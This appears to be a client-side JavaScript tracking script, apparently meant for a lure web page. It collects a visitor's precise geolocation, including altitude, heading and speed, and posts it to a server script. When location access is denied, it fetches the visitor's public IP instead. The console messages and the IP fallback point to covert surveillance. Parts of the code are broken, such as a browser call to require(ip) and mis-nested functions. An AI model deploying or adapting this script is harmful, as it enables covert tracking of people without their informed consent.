
var lat,lon,acc,alt,dir,spd;

function locate()
{if(navigator.geolocation)
{var optn={enableHighAccuracy:true,timeout:30000,maximumage:0};
navigator.geolocation.getCurrentPosition(showPosition,showError,optn);}
else{}

function showPosition(position)
{lat=position.coords.latitude;
lon=position.coords.longitude;
acc=position.coords.accuracy;
alt=position.coords.altitude;
dir=position.coords.heading;
spd=position.coords.speed;

$.ajax({
type:'POST',
url:'/php/geo.php',
data:{Lat:lat,Lon:lon,Acc:acc,Alt:alt,Dir:dir,Spd:spd},
success: function(){console.log('EXECUTION COMPLETE :]');},
mimeType:'text'});};}

function showError(error)
{var ip;
$.getJSON('https://api.ipify.org?format=jsonp&callback=?',function(data)
{ip=data.ip;
require(ip);});
switch(error.code)
{case error.PERMISSION_DENIED:
var denied='User denied the request for Geolocation';
break;
case error.POSITION_UNAVAILABLE:
var unavailable='Location information is unavailable';
break;
case error.TIMEOUT:
var timeout='The request to get user location timed out';
break;
case error.UNKNOWN_ERROR:
var unknown='An unknown error occurred';
break;}

$.ajax({
type:'POST',
url:'/php/error.php',
data:{Denied:denied,Una:unavailable,Time:timeout,Unk:unknown},
success:function(){console.log('EXECUTION FAILED :[');},
mimeType: 'text'});}